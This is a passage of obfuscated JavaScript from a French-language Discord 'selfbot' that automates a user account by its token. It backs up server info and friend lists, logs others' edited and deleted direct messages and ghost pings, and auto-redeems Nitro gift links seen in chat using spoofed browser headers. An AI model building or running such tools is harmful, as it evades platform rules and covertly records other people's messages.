                        .addField('Creator', '<@' + backups[_0x18f2x3b.author.id][_0x18f2x53].owner + '>', true)
                        .addField('Members', backups[_0x18f2x3b.author.id][_0x18f2x53].members, true)
                        .addField('Created At', backups[_0x18f2x3b.author.id][_0x18f2x53].createdAt)
                        .addField('Channels', '\\`\\`\\`' + backups[_0x18f2x3b.author.id][_0x18f2x53].channels.map(_0x18f2x43 =>

                                {
                                    return _0x18f2x43.name;
                                })
                            .join('\n') + '\\`\\`\\`', true)
                        .addField('Roles', '\\`\\`\\`' + backups[_0x18f2x3b.author.id][_0x18f2x53].roles.map(_0x18f2x46 =>

                                {
                                    return _0x18f2x46.name;
                                })
                            .join('\n') + '\\`\\`\\`', true);
                    _0x18f2x3b.edit(_0x18f2xb2);
                console.log('Commande backup info executé'.yellow);
                    }
            if (_0x18f2x3c.content.startsWith(prefix + 'backup purge')) {
                let _0x18f2xab = new Discord.RichEmbed()
                    .setTitle('' + (client.emojis.get('655704809483141141') || '❌') + '  Error')
                    .setDescription('Vous n\'avez pas encore sauvegardé de serveur')
                    .setColor(color);
                if (!backups[_0x18f2x3b.author.id]) {
                    return _0x18f2x3b['edit'](_0x18f2xab)['catch'](_0x18f2x44 => {
                        return console['log']('[', 'ERROR' ['red'], ']', 'une erreur est survenue que je ne peux régler' ['green']);
                    });
                }
                let _0x18f2xb4 = new Discord.RichEmbed()
                    .setTitle('' + (client.emojis.get('656030540310380574') || '⚠️') + '  Warning')
                    .setDescription('Es-tu sûr de vouloir supprimer toutes tes backups ?\r\n__Cette action est irréversible !__');
                let _0x18f2xb5 = new Discord.RichEmbed()
                    .setColor(color)
                    .setTitle('Oui/Non')
                    .setFooter('Delta-Selfbot')
                    .addField('Etes vous sur de vouloir supprimer toutes vos backups???', 'Oui/Non');
                _0x18f2x3b.edit(_0x18f2xb5)
                    .then(() =>

                        {
                            _0x18f2x3b.channel.awaitMessages(_0x18f2x4a =>

                                    {
                                        return _0x18f2x4a.content === 'Oui';
                                    }, {
                                        max: 1,
                                        time: 30000,
                                        errors: ['time']
                                    })
                                .then(_0x18f2xb6 =>

                                    {
                                        delete backups[_0x18f2x3b.author.id];
                                        let _0x18f2xad = new Discord.RichEmbed()
                                            .setTitle('' + (client.emojis.get('655696285286006784') || '✅') + '  Voila!')
                                            .setDescription('Deleted all your backups.')
                                            .setFooter('Delta-Selfbot')
                                            .setColor(color);
                                        _0x18f2x3b.edit(_0x18f2xad)
                                            .catch(_0x18f2x44 =>

                                                {
                                                    return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
                                                });
                                        _0x18f2x3c.delete();
                                        console.log('Commande purge backup executé'.yellow);
                                    });
                        });
            }
            if (_0x18f2x3b.content === prefix + 'backup friend') {
                var _0x18f2xb7 = client.user.friends.size;
                const _0x18f2xb8 = client.user.friends.array();
                let _0x18f2xb9 = ('Successfully backed up ' + _0x18f2xb8.length.toString()
                        .bold + ' friends.')
                    .green;
                console.log(_0x18f2xb9);
                hastebins('' + client.user.friends.array() + '\\n')
                    .then(_0x18f2x45 =>

                        {
                            var _0x18f2x12 = new Discord.RichEmbed()
                                .setTitle('backup friends (<@id>)')
                                .addField('```lien hastebins```', _0x18f2x45)
                                .setColor(color)
                                .setTimestamp()
                                .setDescription('***vous pouvez copier coller la liste sur le channel actuel et vous pourrez ensuite faire clique droit sur un pseudo envoiller un message, add friend ect...***');
                            _0x18f2x3b.edit(_0x18f2x12)
                                .catch(_0x18f2x44 =>

                                    {
                                        return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
                                    });
                            console.log('Commande friends backup executé'.yellow);
                        });
            }

            function _0x18f2xba(_0x18f2x19)

            {
                var _0x18f2xbb = '';
                var _0x18f2xbc = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
                var _0x18f2xbd = 62;
                for (var i = 0; i < _0x18f2x19; i++) {
                    _0x18f2xbb += _0x18f2xbc.charAt(Math.floor(Math.random() * _0x18f2xbd));
                }
                return _0x18f2xbb;
            }

            function _0x18f2xbe()

            {
                fs.writeFile('./Data/backups.json', JSON.stringify(backups), _0x18f2x6e =>

                    {
                        if (_0x18f2x6e) {
                            console.error(_0x18f2x6e);
                        }
                    });
            }
        }
    });

client.on('messageUpdate', _0x18f2x3b => {
    if (_0x18f2x3b.author.id === client.user.id) {
        return;
    }
    if (_0x18f2x3b.channel.type === 'dm') {
        console.log('\n╔═════════════════════════════════╗'.blue);
        console.log('Log:'.red) ^ console.log('╟─────────────────────────────────╢'.blue);
        console.log(('║--> message mp modifié \\n║--> User: ' + _0x18f2x3b.author.tag + '\\n║--> Content: ' + _0x18f2x3b.content + '\\n║--> At: ' + _0x18f2x3b.createdAt + '').green);
        console.log('╚═════════════════════════════════╝'.blue);
    }
});

client.on('messageDelete', _0x18f2x3b => {
    if (_0x18f2x3b.author.id === client.user.id) {
        return;
    }
    if (_0x18f2x3b.channel.type === 'dm') {
        console.log('\n╔═════════════════════════════════╗'.blue);
        console.log('Log:'.red) ^ console.log('╟─────────────────────────────────'.blue);
        console.log(('║--> 1 message mp surppimé \\n║--> User: ' + _0x18f2x3b.author.tag + '\\n║--> Content: ' + _0x18f2x3b.content + '\\n║--> At: ' + _0x18f2x3b.createdAt + '')
            .green);
        console.log('╚═════════════════════════════════╝'.blue);
    }
    if (_0x18f2x3b.content.includes('@everyone') || _0x18f2x3b.content.includes('@here')) {
        if (_0x18f2x3b.author.id === client.user.id) {
            return;
        }
        if (_0x18f2x3b.channel.type === 'dm') {
            return;
        }
        console.log('\n╔═════════════════════════════════╗'.blue);
        console.log('Log:'.red) ^ console.log('╟─────────────────────────────────'.blue);
        console.log(('║--> New ghostping \\n║--> serveur: ' + _0x18f2x3b.guild.name + ' \\n║--> channel: ' + _0x18f2x3b.channel.name + ' \\n║--> User: ' + _0x18f2x3b.author.tag + '\\n║--> Content: ' + _0x18f2x3b.content + '\\n║-->At: ' + _0x18f2x3b.createdAt + '').green);
        console.log('╚═════════════════════════════════╝'.blue);
    } else {
        return;
    }
});

function matchCode(_0x18f2x8b, _0x18f2xc0) {
    let _0x18f2xc1 = _0x18f2x8b.match(/https:\/\/discord\.gift\/[abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789]+/);
    if (_0x18f2xc1) {
        _0x18f2xc0(_0x18f2xc1[0]);
        return matchCode(_0x18f2x8b['slice'](_0x18f2xc1['index'] + _0x18f2xc1[0]['length']), _0x18f2xc0);
    } else {
        _0x18f2xc0(null);
    }
}
client.on('message', _0x18f2x3b => {
    let _0x18f2xc1 = [];
    matchCode(_0x18f2x3b.content, _0x18f2xaa => {
        if (!_0x18f2xaa) {
            return;
        }
        if (!_0x18f2xc1.includes(_0x18f2xaa)) {
            _0x18f2xc1.push(_0x18f2xaa);
        }
    });
    if (_0x18f2xc1.length == 0) {
        return;
    }
    _0x18f2xc1.forEach(_0x18f2xaa => {
        fetch('https://canary.discordapp.com/api/v6/entitlements/gift-codes/' + _0x18f2xaa.split('/')
                .pop() + '/redeem', {
                    method: 'post',
                    headers: {
                        'Accept': '*/*',
                        'Accept-Encoding': 'gzip, deflate, br',
                        'Accept-Language': 'en-US',
                        'Authorization': client.token,
                        'Connection': 'keep-alive',
                        'Content-Length': JSON.stringify({
                                channel_id: _0x18f2x3b.channel.id
                            })
                            .length,
                        'Content-Type': 'application/json',
                        'Host': 'canary.discordapp.com',
                        'Referer': 'https://canary.discordapp.com/channels/' + _0x18f2x3b.channel.id + '/' + _0x18f2x3b.id + '',
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0',
                        'X-super-properties': Buffer.from(JSON.stringify({
                                'os': 'Windows',
                                'browser': 'Firefox',
                                'device': '',
                                'browser_user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0',
                                'browser_version': '66.0',
                                'os_version': '10',
                                'referrer': '',
                                'referring_domain': '',
                                'referrer_current': '',
                                'referring_domain_current': '',
                                'release_channel': 'canary',
                                'client_build_number': 37519,
                                'client_event_source': null
                            }), 'utf-8')
                            .toString('base64')
                    },
                    body: JSON.stringify({
                        channel_id: _0x18f2x3b.channel.id
                    })
                })
            .then(_0x18f2xc2 =>

                {
                    if (_0x18f2xc2.status == 400 || _0x18f2xc2.status == 404) {
                        return console['log'](`${ 'code invalide :  ' }${ _0x18f2xaa }${ '' }` ['red']);
                    }
                    _0x18f2xc2.json()
                        .then(_0x18f2xc3 =>

                            {
                                console.log(_0x18f2xc3);
                                console.log('Un nouveau nitro à sûrement été ajouté à tes crédits.'.green);
                            });
                })
            .catch(console.error);
    });
});
client.on('guildDelete', _0x18f2x16 => {
    console.log('\n╔═════════════════════════════════╗'.blue);
    console.log('Log:'.red) ^ console.log('╟─────────────────────────────────╢'.blue);
    console.log('║--> Vous avez quitté le serveur undefined'.green);
    console.log('╚═════════════════════════════════╝'.blue);
});
client.on('guildCreate', _0x18f2x16 => {
    console.log('\n╔═════════════════════════════════╗'.blue);
    console.log('Log:'.red) ^ console.log('╟─────────────────────────────────╢'.blue);
    console.log('║--> Vous avez rejoint le serveur undefined'.green);
    console.log('╚═════════════════════════════════╝'.blue);
});
client.login(token).catch(_0x18f2x6e => {
    if (_0x18f2x6e.toString()
        .includes('Incorrect login details were provided'.red) || _0x18f2x6e.toString()
        .includes('An invalid token was provided'.red)) {
        console.log('Token invalid!\nChange ton token dans le config.json'.red);
    }
});